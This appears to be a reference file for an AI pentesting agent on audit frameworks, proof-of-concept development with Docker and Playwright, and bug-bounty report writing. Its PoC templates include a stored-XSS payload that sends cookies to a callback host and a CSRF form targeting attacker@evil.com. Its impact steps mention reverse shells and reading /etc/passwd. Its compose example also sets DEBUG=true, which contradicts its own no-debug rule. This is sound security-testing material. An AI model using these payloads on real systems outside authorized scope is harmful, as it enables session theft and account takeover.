# Audit, PoC Development & Report Reference

> **On-demand only** — this file loads when the user requests formal audit, PoC development, or vulnerability report generation.

---

## Formal Audit Framework

### Multi-Framework Approach

Use OWASP as primary, supplement with STRIDE and PASTA for threat modeling:

| Framework | Focus | When to Use |
|-----------|-------|-------------|
| **OWASP Top 10** | Web application vulnerabilities | Default for web app audits |
| **OWASP ASVS** | Verification standard with levels (L1/L2/L3) | Compliance-driven audits |
| **STRIDE** | Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation | Threat modeling phase |
| **PASTA** | Process for Attack Simulation and Threat Analysis | Risk-centric audits |
| **CWE** | Common Weakness Enumeration | Mapping findings to standard identifiers |

### Audit Phases

1. **Scope definition** — assets, boundaries, rules of engagement, out-of-scope items
2. **Threat modeling** — STRIDE per component, identify trust boundaries, data flow diagrams
3. **Automated scanning** — SAST + DAST + dependency scanning (see `chaining-advanced-techniques.md`)
4. **Manual testing** — follow SKILL.md phases 1-6 for each in-scope component
5. **Chain analysis** — attempt to combine findings for higher impact
6. **Reporting** — structured findings with CVSS scores, evidence, remediation

### Red Team Personas

Approach the target from multiple attacker perspectives:

| Persona | Motivation | Techniques |
|---------|-----------|------------|
| **Script Kiddie** | Opportunistic, uses public tools | Nuclei, SQLMap, default creds, known CVEs |
| **Bug Bounty Hunter** | Financial reward, creative chains | Logic flaws, race conditions, chain building |
| **Insider Threat** | Privileged access, data exfil | Mass assignment, IDOR, credential abuse |
| **APT Actor** | Persistent access, stealth | Supply chain, zero-day, living off the land |
| **Competitor** | Business intelligence | API scraping, data enumeration, IP theft |
| **Hacktivist** | Defacement, data leak | SQLi for data dump, stored XSS, account takeover |

For each persona: what would they target first? What access do they start with? What tools would they use?

---

## Live Exploitation Priority

Attack in priority order. Don't waste time on Medium findings if Critical ones exist.

**P0 - Critical:** RCE (webshell upload, deserialization, template injection, command injection, eval injection, JNDI injection)

**P1 - High:** SQLi, SSRF, auth bypass, path traversal / arbitrary file read, IDOR with sensitive data exposure, XXE with file read/SSRF

**P2 - Medium:** Stored XSS, CSRF on critical actions, race conditions on financial operations, mass assignment to privilege escalation, prototype pollution, HTTP request smuggling

**P3 - Low:** Reflected XSS, information disclosure, missing security headers, CORS misconfiguration, open redirect (unless chainable), subdomain takeover

For each finding: identify the source (user input), trace through transforms, confirm it reaches the sink, craft a working payload, prove impact.

---

## Proof-of-Concept Development

### PoC Methodology

**Before any PoC work: confirm the environment passes the Realism Gate.**
- The app runs **unmodified** — same Dockerfile, compose file, configs, entrypoint. No debug flags, no feature toggles, no `DEBUG=true`.
- If no container setup exists: create **two separate networks** — victim (unmodified app) and attacker (exploit tooling). The victim side must be production-identical.
- **Absolutely no mocked APIs, simulated responses, or synthetic shortcuts.** Every step must be a real HTTP request, real database query, real browser interaction.
- Use existing `docker-compose.yml` if present. You may add a vanilla container to the same network for attacker/victim tooling, but never alter the target service definition.
- **Responsible disclosure principle:** if the exploit requires altering the app's normal behavior, it is not a confirmed vulnerability.

1. **Identify the vulnerability** — exact sink, controllable input, bypass path
2. **Minimal reproduction** — simplest possible payload that demonstrates the issue, running against the unmodified app
3. **Impact demonstration** — escalate to show real-world consequences:
   - RCE → execute `id`/`whoami`, read `/etc/passwd`, establish reverse shell
   - SQLi → extract sensitive data (passwords, API keys, PII)
   - SSRF → access cloud metadata, internal services
   - XSS → steal session cookie, perform action as victim
   - Auth bypass → access protected resources as another user
4. **Chain building** — combine with other findings for maximum impact
5. **Clean up** — remove uploaded shells, test data, and artifacts

### PoC Requirements

Every PoC must include:
- **One-liner summary** of what the vulnerability is
- **Exact curl/HTTP request** or script that triggers it (copy-pasteable)
- **Expected vs actual response** showing the vulnerability
- **Impact statement** — what an attacker gains
- **Prerequisites** — auth level, network position, timing requirements
- **Verification that the app ran unmodified** — state which compose file or container setup was used, confirm no debug flags or config changes were made

### PoC Must Ship in Two Forms

Every confirmed finding requires **two deliverables**. One without the other is incomplete and the finding stays at Candidate.

| # | Form | Audience | Contents |
|---|------|----------|----------|
| **1** | **Step-by-step (explanatory)** | Reviewer / triager / vendor | Narrative walkthrough of the vulnerability cause → source→sink trace → why the sink is exploitable → conditions → each exploit step with **only the necessary scripts and commands**, no bundled tooling, no automation. Each command is shown, its output explained, and the impact justified. A reviewer following along should understand the bug without running anything. |
| **2** | **Full bundled PoC** | Reproducer / CI / verification | Self-contained, `docker compose up && ./poc.sh` runnable directory. Contains: `docker-compose.poc.yml` (or equivalent), all scripts, payloads, and a `README.md` with the single command to reproduce. No manual steps beyond the documented prerequisites. A third party can clone, run, see the exploit work. |

**Form 1 establishes the vulnerability is real** (reviewer comprehends the bug). **Form 2 establishes the vulnerability is exploitable** (reviewer reproduces the impact). Both are required for a `Confirmed` classification.

**Anti-caveat rule:** the PoC must prove impact against the app as it ships. Any scenario that requires `--debug`, config edits, feature flags, or mocked third-party services to demonstrate the exploit is a **Candidate** finding, not Confirmed. The finding severity is downgraded accordingly.

### PoC Script Template

```
# Vulnerability: [Type] in [Component]
# Severity: [P0/P1/P2/P3]
# CWE: [CWE-ID]
# CVSS: [Score] ([Vector])

# Prerequisites:
# - [Auth level required]
# - [Network position]

# Reproduction:
curl -X POST 'https://target.com/vulnerable-endpoint' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=ATTACKER_SESSION' \
  -d '{"param": "PAYLOAD_HERE"}'

# Expected: [safe behavior]
# Actual: [vulnerable behavior]
# Impact: [what attacker gains]
```

### Reproduction Environment Setup

#### Docker-Compose Lab Architecture

The best methodology for PoC reproduction is a docker-compose stack that mirrors real exploit conditions:

**Step 1 — Check for existing containerization:**
Before creating a new setup, check if the target app already has:
- `Dockerfile` or `docker-compose.yml` in the repository root
- Container definitions in CI/CD configs (`.github/workflows/`, `Jenkinsfile`, etc.)
- README instructions for Docker-based development

If present, extend the existing compose file rather than creating from scratch.

**Step 2 — Build the compose stack:**

```yaml
# docker-compose.poc.yml
version: "3.9"

services:
  # A. Target Application
  target:
    build:
      context: .
      dockerfile: Dockerfile        # Use existing Dockerfile if available
    ports:
      - "8080:8080"                  # Expose for Playwright interaction
    networks:
      - internal
      - external
    environment:
      - DEBUG=true                   # Enable verbose logging for evidence

  # B. Attacker Callback / OOB Listener (for SSRF, OOB-XXE, DNS rebinding, blind injection)
  callback:
    image: python:3-slim
    command: >
      python -c "
      from http.server import HTTPServer, SimpleHTTPRequestHandler
      import logging
      logging.basicConfig(level=logging.INFO)
      class H(SimpleHTTPRequestHandler):
          def do_GET(self):
              logging.info(f'CALLBACK: {self.path} from {self.client_address}')
              self.send_response(200)
              self.end_headers()
              self.wfile.write(b'callback-received')
          do_POST = do_GET
      HTTPServer(('0.0.0.0', 9999), H).serve_forever()
      "
    ports:
      - "9999:9999"                  # Expose for external monitoring
    networks:
      - internal                     # Shares network with target — critical for SSRF/OOB
      - external

  # C. DNS rebinding server (optional — only for DNS rebinding / SSRF bypass tests)
  # dns-rebind:
  #   image: nccgroup/singularity
  #   networks:
  #     - internal

  # D. Internal service (optional — simulates internal infra for SSRF pivoting)
  # internal-service:
  #   image: redis:7-alpine
  #   networks:
  #     - internal                   # NOT exposed externally

networks:
  internal:
    driver: bridge
    internal: true                   # No internet — simulates private network
  external:
    driver: bridge
```

**When to include the callback container:**
- SSRF testing (target reaches `http://callback:9999/ssrf-proof`)
- Out-of-band XXE/SSRF exfiltration
- Blind injection confirmation (SQLi, SSTI, command injection)
- DNS rebinding PoCs
- Any vulnerability requiring out-of-band confirmation

**When NOT needed (target container alone suffices):**
- Reflected/stored XSS (client-side — use Playwright directly)
- IDOR/broken access control
- Logic bugs
- Authentication bypass
- Direct response-based injection (in-band SQLi, direct RCE output)

#### Playwright Full-Interaction PoC

**Almost mandatory for client-side vulnerabilities.** Playwright provides:
- Full browser interaction with video recording — indisputable proof
- JavaScript execution context — necessary for DOM XSS, CSRF, clickjacking PoCs
- Network interception — capture exact requests/responses
- Multi-page flows — login → navigate → trigger → exfiltrate chains

**Playwright PoC template:**

```typescript
// poc.spec.ts — Playwright PoC with video recording
import { test, expect } from '@playwright/test';

test.describe('Vulnerability PoC', () => {
  test.use({
    video: 'on',                    // ALWAYS record video for evidence
    screenshot: 'on',               // Capture screenshots at key moments
    trace: 'on',                    // Full trace for timeline analysis
  });

  test('XSS-001: Stored XSS in comment field', async ({ page }) => {
    // Step 1: Authenticate (if needed)
    await page.goto('http://localhost:8080/login');
    await page.fill('#username', 'attacker');
    await page.fill('#password', 'password');
    await page.click('#login-btn');

    // Step 2: Inject payload
    const payload = '<img src=x onerror="fetch(\'http://callback:9999/xss-proof?cookie=\'+document.cookie)">';
    await page.goto('http://localhost:8080/comments');
    await page.fill('#comment-input', payload);
    await page.click('#submit');

    // Step 3: Trigger as victim (new context = different user)
    const victimContext = await page.context().browser()!.newContext();
    const victimPage = await victimContext.newPage();
    await victimPage.goto('http://localhost:8080/login');
    await victimPage.fill('#username', 'victim');
    await victimPage.fill('#password', 'password');
    await victimPage.click('#login-btn');

    // Step 4: Victim views the page with stored XSS
    await victimPage.goto('http://localhost:8080/comments');

    // Step 5: Verify callback received (check callback container logs)
    // docker logs poc-callback-1 | grep "xss-proof"

    await victimContext.close();
  });

  test('SSRF-001: Server-side request to internal network', async ({ page }) => {
    await page.goto('http://localhost:8080/fetch-url');

    // Inject internal URL pointing to callback container
    await page.fill('#url-input', 'http://callback:9999/ssrf-proof');
    await page.click('#fetch-btn');

    // The callback container logs will show the request came from the target container
    // Proving the server followed the URL to the internal network
  });

  test('CSRF-001: State-changing action without token', async ({ page, context }) => {
    // Step 1: Victim is logged in
    await page.goto('http://localhost:8080/login');
    await page.fill('#username', 'victim');
    await page.fill('#password', 'password');
    await page.click('#login-btn');

    // Step 2: Attacker page triggers cross-origin request
    await page.setContent(`
      <html><body>
        <h1>Attacker Page</h1>
        <form id="csrf" action="http://localhost:8080/api/change-email" method="POST">
          <input name="email" value="attacker@evil.com">
        </form>
        <script>document.getElementById('csrf').submit();</script>
      </body></html>
    `);

    // Step 3: Verify email was changed
    await page.goto('http://localhost:8080/profile');
    await expect(page.locator('#email')).toContainText('attacker@evil.com');
  });
});
```

**Playwright config for PoC recording:**

```typescript
// playwright.config.ts
import { defineConfig } from '@playwright/test';

export default defineConfig({
  use: {
    baseURL: 'http://localhost:8080',
    video: 'on',                     // Always record
    screenshot: 'only-on-failure',
    trace: 'on',
  },
  outputDir: './poc-evidence/',       // All artifacts in evidence directory
  reporter: [['html', { outputFolder: './poc-report/' }]],
});
```

**When to use Playwright (almost mandatory):**
- DOM XSS — need browser JS execution context to prove DOM manipulation
- Stored XSS — need multi-user flow (attacker stores, victim triggers)
- CSRF — need cross-origin request with victim's session
- Clickjacking — need iframe interaction
- Open redirect chains — need to follow redirects in browser context
- OAuth flow attacks — multi-step browser interactions
- Client-side prototype pollution — need browser object manipulation
- Any multi-step exploit chain involving user interaction

**When curl/scripts suffice (Playwright optional but nice):**
- Server-side injection (SQLi, RCE, SSTI) — curl proves it
- SSRF — curl or python script with exact request
- XXE — curl with XML payload
- Deserialization — python/java script generating serialized payload
- API-level auth bypass — curl with modified headers/tokens

#### PoC Script Anti-Patterns

Common mistakes that make PoCs fail silently or produce misleading results:

| Anti-Pattern | What Goes Wrong | Fix |
|-------------|----------------|-----|
| **`docker exec` quoting** | `docker exec target sh -c "echo $VAR"` — host shell expands `$VAR` before it reaches the container | Use single quotes for the outer shell: `docker exec target sh -c 'echo $VAR'`, or escape: `\$VAR` |
| **Playwright dialog timing** | `page.on('dialog')` registered AFTER the action that triggers `alert()`/`confirm()` — dialog fires before handler is ready, blocks all further events | Register the dialog handler BEFORE the triggering action: `page.on('dialog', d => d.accept())` then `page.click('#trigger')` |
| **Container network isolation** | PoC uses `localhost` to reach the callback container from within the target container — fails because `localhost` inside a container refers to itself | Use Docker Compose service names: `http://callback:9999/proof` not `http://localhost:9999/proof` |
| **Race between containers** | PoC script runs immediately after `docker compose up -d` — target app hasn't finished starting | Add a health check loop: `until curl -sf http://localhost:8080/health; do sleep 1; done` |
| **Hardcoded sleep instead of wait** | `sleep 10` hoping the server is ready — either too short (flaky) or too long (wastes time) | Use health check endpoints, `wait-for-it.sh`, or Playwright's `waitForResponse()` / `waitForSelector()` |
| **Missing `--network` in standalone docker run** | `docker run` PoC container can't reach compose network services | Use `--network=<project>_internal` or add the PoC container to `docker-compose.poc.yml` |
| **Playwright `page.setContent()` + fetch to relative URL** | `setContent()` sets origin to `about:blank` — relative fetches and cookie-based CSRF fail | Use `page.goto()` to an actual URL first, or use absolute URLs in injected HTML |
| **Curl follows redirects silently** | `curl` without `-L` misses the redirect; with `-L` follows it but loses POST body and auth headers on cross-origin redirect | Use `-L` for GET, but for POST use `-L --post301 --post302` to preserve method; check `-v` output to verify headers survive |
| **Payload encoding mismatch** | URL-encoded payload sent in JSON body, or JSON payload sent as form-encoded — server rejects or misparses | Match `Content-Type` to payload format: `application/json` for JSON, `application/x-www-form-urlencoded` for form data |
| **Stale cookies/tokens** | PoC hardcodes a session cookie that expires — works once, fails on replay | Script the auth flow: login → capture cookie → use in subsequent requests, all in one script run |

#### Evidence Collection Protocol

After reproduction, collect:
1. **Video recording** — from Playwright (`poc-evidence/*.webm`)
2. **Network trace** — Playwright trace file or HAR export
3. **Callback container logs** — `docker compose logs callback` for OOB proof
4. **Target container logs** — `docker compose logs target` for server-side evidence
5. **Screenshots** — key moments (injection, trigger, impact)
6. **Exact commands** — reproducible curl/script for server-side vulns

#### Running the PoC

```bash
# 1. Start the lab environment
docker compose -f docker-compose.poc.yml up -d

# 2. Wait for target to be ready
until curl -s http://localhost:8080/health > /dev/null 2>&1; do sleep 1; done

# 3. Run Playwright PoC (client-side vulns)
npx playwright test poc.spec.ts

# 4. Or run curl-based PoC (server-side vulns)
./poc-ssrf.sh

# 5. Collect evidence
docker compose -f docker-compose.poc.yml logs > poc-evidence/container-logs.txt

# 6. Teardown
docker compose -f docker-compose.poc.yml down -v
```

---

## Proof Collection

Every reported vulnerability MUST include:

1. **Confidence Score (1-10)** — how confident you are this is a real, exploitable issue
2. **Exploitability Likelihood (High/Medium/Low)** + 1-2 sentence justification — how likely is real-world exploitation?
   - **High**: no auth needed, publicly reachable, low complexity, known exploit patterns
   - **Medium**: requires auth or specific conditions, moderate complexity
   - **Low**: requires privileged access, rare conditions, or complex multi-step chain
   - Example: `High — unauthenticated endpoint with no rate limiting, public PoC exists for this CVE`
3. **Auth Level** — required access to trigger the vulnerability:
   - **Unauthenticated** — no credentials needed
   - **Authenticated** — specify the minimum role required (viewer, editor, user, admin, superadmin)
   - **Multi-level** — affects multiple auth levels differently (specify each)
4. **Intent Verification Gate** — double-check that the finding is NOT an intended feature:

   | Question | If YES → likely intended feature |
   |----------|--------------------------------|
   | Does the application documentation describe this as expected functionality? | Admin plugin upload in WordPress, superuser SSH access, debug endpoints behind auth |
   | Is the "attacker" already at the privilege level where this action is expected? | Admin executing code via plugin, root user accessing system files |
   | Would "fixing" this break legitimate workflows? | Removing admin code execution breaks plugin system |
   | Is this a well-known trade-off the platform explicitly accepts? | CMS admin RCE via theme editor, CI/CD pipeline command execution |

   **If all answers are NO → actual bug. If any answer is YES → investigate further:**
   - Is the feature accessible at a LOWER privilege level than intended? (admin feature reachable by editor = real bug)
   - Can it be triggered WITHOUT the expected authentication? (intended admin feature reachable unauthenticated = real bug)
   - Does it expose MORE than the intended scope? (admin file read intended for config but reaches `/etc/shadow` = real bug)

   **Common false positive examples:**
   - WordPress admin uploading a malicious plugin → intended feature (admin has full control by design)
   - Jenkins admin configuring a build step with `sh` → intended feature
   - Grafana admin adding a data source with SSRF potential → intended feature (admin configures integrations)
   - SSH access as root user → intended feature (root has full system access)
   - **BUT**: WordPress *editor* uploading a plugin → real bug (privilege escalation)
   - **BUT**: Jenkins *anonymous* triggering builds → real bug (missing auth)

5. **Intent Classification** — based on the gate above, classify as:
   - **Actual bug**: unintended behavior that violates security assumptions
   - **Intended feature**: functionality working as designed — do NOT report as vulnerability
   - **Design weakness**: intended but represents poor security design — report as Observation with recommendation
6. **Justification** — brief reasoning for the classification
7. **Exact payload** — copy-pasteable, not screenshots
8. **Server response** — proving impact (status code, body excerpt, or out-of-band callback log)
9. **Step-by-step reproduction** — numbered, command-exact walkthrough; a reviewer must be able to follow along and understand the bug without running anything
10. **Video recording** — full exploit chain end-to-end (**supplementary only** — video cannot be independently verified and provides no command-level audit trail; a submission based solely on a video attachment is auto-rejected; always accompany with step-by-step text and a runnable PoC script)

Low-confidence findings (score <= 3) go under a separate **Observations** section, not mixed in with confirmed vulnerabilities. Intended features flagged as design weaknesses also go under Observations.

For multi-role vulns: demonstrate from admin, user, and unauthenticated perspectives. For race conditions: show concurrent request tool (Turbo Intruder, threading script). Clean up uploaded shells and test data after recording.

Organize evidence by severity. Master report links to individual agent reports, video files, and raw scanner output.

### Submission N/A Criteria (Guaranteed Rejection)

A finding with **any** of the following properties will be closed as Not Applicable by bug bounty programs. If a finding triggers any row, move it to Observations and resolve the gap before submitting.

| Condition | Why It Fails | How to Fix |
|-----------|-------------|------------|
| **Speculative or misleading impact** | "An attacker *could* theoretically…" without a working payload is noise, not a finding | Build a working PoC demonstrating the stated impact end-to-end |
| **Missing proof of concept** | No PoC = no reproducible evidence = no confidence in exploitability | Produce both PoC forms (step-by-step + bundled script) before reporting |
| **Not reproducible** | Reviewer clones the repo, runs the steps, exploit does not fire | Test on a clean environment; pin all dependency versions; remove local-state assumptions |
| **Based solely on a video attachment** | Video cannot be independently verified; no command-level audit trail | Replace with step-by-step text + runnable script; video may accompany but never substitute |
| **Lacking demonstrated impact** | Consequences asserted but not shown (no data exfil, no shell, no ATO, no CSRF state change) | Re-run Phase 7 Q3 — if you cannot prove impact with a payload and server response, the finding is Candidate |

### Always-Rejected Findings (Do Not Report)

These are commonly submitted findings that bug bounty programs universally reject. Do not report unless part of a demonstrated exploit chain with proven impact:

| Finding | Why It's Rejected | When It Becomes Valid |
|---------|-------------------|---------------------|
| Missing security headers alone (`X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`) | No demonstrated impact — headers are defense-in-depth | Only if the missing header is a required prerequisite in a working exploit chain (e.g., missing `X-Frame-Options` + clickjacking PoC with state change) |
| CORS wildcard (`Access-Control-Allow-Origin: *`) without credential exfiltration | Browsers block `*` + `withCredentials` — no cookie/token leakage | Only if combined with `Access-Control-Allow-Credentials: true` AND sensitive data exfiltrated in PoC |
| GraphQL introspection enabled alone | Introspection is a development feature, not a vulnerability | Only if introspection reveals mutations/fields that lead to demonstrated auth bypass or data leak |
| Open redirects without OAuth/auth chaining | Low impact — redirect to phishing page is social engineering, not a technical vuln | Only when chained: open redirect → OAuth token theft → ATO, or open redirect → SSRF filter bypass |
| SSRF with DNS-only callbacks (no response, no internal access) | Proves DNS resolution but not exploitability | Only if callback proves access to internal network (response data, cloud metadata, or internal service interaction) |
| Self-XSS (requires victim to paste payload in their own browser) | Attacker cannot trigger it remotely | Only when chained with cookie tossing, login CSRF, or clickjacking to deliver the payload without victim cooperation |
| Server/technology banner disclosure (`Server: Apache/2.4.51`, `X-Powered-By: PHP/8.1`) | Version information alone is not exploitable | Only if the disclosed version has a known, exploitable CVE AND you demonstrate the exploit working |
| Shell/exec sink where the "user-controlled" arg is a hardcoded string constant | Grep the symbol — if it is assigned once to a string literal and never reassigned, the finding is a false positive | Only when dynamic user input is confirmed to flow into the sink at runtime |
| Regex-chain across modules where each link uses a different regex | Do not assume two regex constants "feed" each other without tracing the data-flow path | Only when the actual data-flow path source → regex A → regex B is traced end-to-end |

**Rule of thumb:** if the finding requires the phrase "an attacker could theoretically…" without a working PoC, it belongs in Observations, not Vulnerabilities.

---

## Vulnerability Report Template

### Executive Summary
- Total findings by severity (Critical/High/Medium/Low/Informational)
- Composite risk score (see `chaining-advanced-techniques.md` for scoring)
- Top 3 highest-impact findings
- Overall security posture assessment

### Scope & Methodology
- Target application(s) and version(s)
- Testing period
- Frameworks used (OWASP, STRIDE, etc.)
- Tools used (manual + automated)
- Limitations and out-of-scope items

### Findings

For each finding:

```
### [SEVERITY] [ID]: [Title]

**CWE:** CWE-XXX
**CVSS:** X.X (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
**Confidence:** X/10
**Exploitability Likelihood:** High / Medium / Low — [1-2 sentence justification: why this likelihood rating, considering attack complexity, required conditions, and public exploit availability]
**Auth Level:** Unauthenticated / Authenticated (specify role: viewer, editor, admin, superadmin) / Multi-level (specify which levels affected)
**Intent:** Actual bug / Intended feature / Design weakness (see Intent Verification Gate in Proof Collection above)

**Description:**
[What the vulnerability is, where it exists]

**Reproduction Steps:**
1. [Step 1]
2. [Step 2]
3. [Step 3]

**Payload:**
```
[Exact copy-pasteable payload]
```

**Evidence:**
[Screenshot/response/video reference]

**Impact:**
[What an attacker can achieve]

**Remediation:**
[Specific fix recommendation with code example]

**References:**
- [CVE/CWE/OWASP reference]
```

### Observations
- Low-confidence findings (score <= 3) with reasoning
- Design weaknesses (intended features with poor security design — include recommendation)
- Potential issues requiring further investigation
- Informational notes about security posture

### Remediation Priority
1. **Immediate** (P0 Critical) — fix before next deployment
2. **Short-term** (P1 High) — fix within current sprint
3. **Medium-term** (P2 Medium) — fix within next release cycle
4. **Long-term** (P3 Low) — address in security backlog

### Appendix
- Full tool output (scanner results, taint analysis reports)
- Network diagrams and data flow maps
- Raw HTTP request/response pairs for each finding
